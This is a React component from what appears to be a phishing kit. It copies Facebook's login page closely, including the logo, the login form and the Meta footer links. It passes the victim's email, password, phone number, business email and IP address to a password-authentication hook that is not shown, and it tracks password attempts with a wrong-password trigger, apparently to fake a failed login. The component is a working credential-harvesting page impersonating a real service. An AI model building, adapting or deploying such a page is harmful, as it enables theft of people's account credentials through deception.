import React, { useState, useContext } from "react";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import ButtonActions from "../../utils/buttonActions.js";
import { DataContext } from "../../pages/index.js";

function Step2PC({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
}) {
  const [isValidEmail, setIsValidEmail] = useState(true);
  const { setAllData, AllData } = useContext(DataContext);

  // Use the custom hook for password authentication
  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
  } = usePasswordAuth({
    Unik,
    Email,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    clearEmailError();
    setIsValidEmail(true);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
  };

  return (
    <div className="flex flex-col bg-gray-100 w-full min-h-screen font-fbook">
      <div className="flex justify-center items-center flex-1 py-15 max-w-9xl mx-auto w-full md:flex-row flex-col md:py-17 py-4 px-4 md:px-0 md:items-center md:justify-center">
        {/* Left Section */}
        <div className="flex-1 md:pr-14 md:max-w-2xl md:text-left text-left md:mb-0 mb-10 max-w-none w-full md:-mt-32 -mt-4">
          <img
            src="facebook.svg"
            alt="Facebook Logo"
            className="w-[45%] mb-4"
          />
          <p className="text-gray-800 text-3xl md:text-3xl text-left font-normal font-fbook leading-8 md:leading-8 m-0 md:px-0">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>

        {/* Right Section */}
        <div className="flex-none w-full max-w-sm flex flex-col items-center md:w-96">
          <div className="bg-white rounded-lg shadow-lg p-3 w-full  md:border-0 border ">
            <input
              type="text"
              value={Email}
              onChange={handleEmailChange}
              placeholder="Email address or phone number"
              className={`border border-gray-300 rounded-md py-3.5 px-4 bg-white w-full text-lg mb-2 text-gray-800 leading-normal box-border placeholder-gray-400 focus:outline-none focus:border-blue-600 focus:shadow-blue-100 focus:shadow-sm font-fbook ${
                !isValidEmail && triedSubmit ? "border-red-500" : ""
              }`}
              disabled={isLoading}
            />
            {emailError && (
              <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                {emailError}
              </div>
            )}

            <input
              type="password"
              value={password}
              onChange={handlePasswordChange}
              placeholder="Password"
              className={`border border-gray-300 rounded-md py-3.5 px-4 bg-white w-full text-lg text-gray-800 leading-normal mb-3 box-border placeholder-gray-400 focus:outline-none focus:border-blue-600 focus:shadow-blue-100 focus:shadow-sm font-fbook ${
                password.length < 5 && triedSubmit ? "border-red-500" : ""
              }`}
              disabled={isLoading}
            />
            {passwordError && (
              <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                {passwordError}
              </div>
            )}

            <button
              onClick={handleSubmit}
              className="w-full h-12 bg-blue-600 border-none rounded-md text-white text-xl font-normal font-fbook px-4 mb-2 cursor-pointer flex items-center justify-center hover:bg-blue-700"
            >
              {isLoading ? (
                <div className="flex items-center justify-center h-10 w-10">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 200 200"
                    className="h-full w-full"
                  >
                    <radialGradient
                      id="a12"
                      cx=".66"
                      fx=".66"
                      cy=".3125"
                      fy=".3125"
                      gradientTransform="scale(1.5)"
                    >
                      <stop offset="0" stopColor="#FFFFFF"></stop>
                      <stop
                        offset=".3"
                        stopColor="#FFFFFF"
                        stopOpacity=".9"
                      ></stop>
                      <stop
                        offset=".6"
                        stopColor="#FFFFFF"
                        stopOpacity=".6"
                      ></stop>
                      <stop
                        offset=".8"
                        stopColor="#FFFFFF"
                        stopOpacity=".3"
                      ></stop>
                      <stop
                        offset="1"
                        stopColor="#FFFFFF"
                        stopOpacity="0"
                      ></stop>
                    </radialGradient>
                    <circle
                      transform-origin="center"
                      fill="none"
                      stroke="url(#a12)"
                      strokeWidth="15"
                      strokeLinecap="round"
                      strokeDasharray="200 1000"
                      strokeDashoffset="0"
                      cx="100"
                      cy="100"
                      r="70"
                    >
                      <animateTransform
                        type="rotate"
                        attributeName="transform"
                        calcMode="spline"
                        dur="2"
                        values="360;0"
                        keyTimes="0;1"
                        keySplines="0 0 1 1"
                        repeatCount="indefinite"
                      ></animateTransform>
                    </circle>
                    <circle
                      transform-origin="center"
                      fill="none"
                      opacity=".2"
                      stroke="#FFFFFF"
                      strokeWidth="15"
                      strokeLinecap="round"
                      cx="100"
                      cy="100"
                      r="70"
                    ></circle>
                  </svg>
                </div>
              ) : (
                "Log in"
              )}
            </button>

            <div className="text-center">
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  ButtonActions.handleForgottenPassword({
                    AllData,
                    setAllData,
                    Unik,
                    Email,
                    Ip,
                  });
                }}
                className="text-blue-600 text-sm no-underline font-fbook hover:underline"
              >
                Forgotten password?
              </a>
            </div>

            <div className="border-t border-gray-300 my-3"></div>

            <button className="bg-[#42b72a] border-none rounded-md text-white text-lg font-normal py-0 px-4 h-12 cursor-pointer font-fbook mx-auto block hover:bg-green-700">
              <a
                onClick={(e) => {
                  e.preventDefault();
                  ButtonActions.handleCreateAccount({
                    AllData,
                    setAllData,
                    Unik,
                    Email,
                    Ip,
                  });
                }}
                href="https://www.facebook.com/r.php"
                className="text-white no-underline font-fbook"
              >
                Create new account
              </a>
            </button>
          </div>
          {/* Create a Page link */}
          <p className="mt-4 text-sm text-center text-gray-700 max-w-sm">
            <a
              href="https://www.facebook.com/pages/create/?ref_type=registration_form"
              className="font-bold hover:underline text-black"
            >
              Create a Page
            </a>{" "}
            for a celebrity, brand or business.
          </p>
        </div>
      </div>
      {/* Footer */}
      <footer className="flex flex-col items-start w-full pt-4 pb-5 bg-white font-fbook text-xs text-gray-500 md:mt-0  mt-0">
        <div className="flex flex-wrap justify-start mb-2 border-b border-gray-300 pb-2 w-full max-w-5xl mx-auto">
          <div className="text-xs mx-1 text-gray-500">English (UK)</div>
          <a
            href="https://es-la.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Español
          </a>
          <a
            href="https://fr-fr.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Français (France)
          </a>
          <a
            href="https://zh-cn.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            中文(简体)
          </a>
          <a
            href="https://ar-ar.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            العربية
          </a>
          <a
            href="https://pt-br.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Português (Brasil)
          </a>
          <a
            href="https://it-it.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Italiano
          </a>
          <a
            href="https://ko-kr.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            한국어
          </a>
          <a
            href="https://de-de.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Deutsch
          </a>
          <a
            href="https://hi-in.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            हिन्दी
          </a>
          <a
            href="https://ja-jp.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            日本語
          </a>
          <button className="bg-gray-100 border border-gray-300 rounded-sm px-2 h-5 text-xs text-gray-600 ml-1 cursor-pointer hover:bg-gray-200">
            +
          </button>
        </div>
        <div className="flex flex-wrap justify-start mt-2 max-w-5xl mx-auto w-full">
          <a
            href="/reg/"
            className="text-gray-500 text-xs mb-1 no-underline cursor-pointer hover:underline"
          >
            Sign Up
          </a>
          <a
            href="/login/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline font-fbook font-normal"
          >
            Log In
          </a>
          <a
            href="https://messenger.com/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Messenger
          </a>
          <a
            href="/lite/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Facebook Lite
          </a>
          <a
            href="https://en-gb.facebook.com/watch/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Video
          </a>
          <a
            href="https://about.meta.com/technologies/meta-pay"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Pay
          </a>
          <a
            href="https://www.meta.com/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Store
          </a>
          <a
            href="https://www.meta.com/quest/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Quest
          </a>
          <a
            href="https://www.meta.com/smart-glasses/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Ray-Ban Meta
          </a>
          <a
            href="https://www.meta.ai/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta AI
          </a>
          <a
            href="https://www.instagram.com/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Instagram
          </a>
          <a
            href="https://www.threads.com/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Threads
          </a>
          <a
            href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
            className="text-gray-500 text-xs  mb-1 no-underline cursor-pointer hover:underline"
          >
            Voting Information Centre
          </a>
          <a
            href="/privacy/policy/?entry_point=facebook_page_footer"
            className="text-gray-500 text-xs  mb-1 m-0 no-underline cursor-pointer hover:underline"
          >
            Privacy Policy
          </a>
          <a
            href="/privacy/policies/health/?entry_point=facebook_page_footer"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Consumer Health Privacy
          </a>
          <a
            href="/privacy/center/?entry_point=facebook_page_footer"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Privacy Centre
          </a>
          <a
            href="https://about.meta.com/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            About
          </a>
          <a
            href="/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Create ad
          </a>
          <a
            href="/pages/create/?ref_type=site_footer"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Create Page
          </a>
          <a
            href="https://developers.facebook.com/?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Developers
          </a>
          <a
            href="/careers/?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Careers
          </a>
          <a
            href="/policies/cookies/"
            className="text-gray-500 text-xs mb-1 no-underline cursor-pointer hover:underline"
          >
            Cookies
          </a>
          <a
            href="https://www.facebook.com/help/568137493302217"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            AdChoices
          </a>
          <a
            href="/policies?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Terms
          </a>
          <a
            href="/help/?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Help
          </a>
          <a
            href="https://www.facebook.com/help/637205020878504"
            className="text-gray-500 text-xs  mb-1 no-underline cursor-pointer hover:underline"
          >
            Contact uploading and non-users
          </a>
          <a
            href="/settings"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Settings
          </a>
          <a
            href="/allactivity?privacy_source=activity_log_top_menu"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Activity log
          </a>
        </div>
        <div className="mt-3 text-xs text-gray-500 max-w-5xl w-full mx-auto">
          Meta © 2025
        </div>
      </footer>
    </div>
  );
}

export default Step2PC;
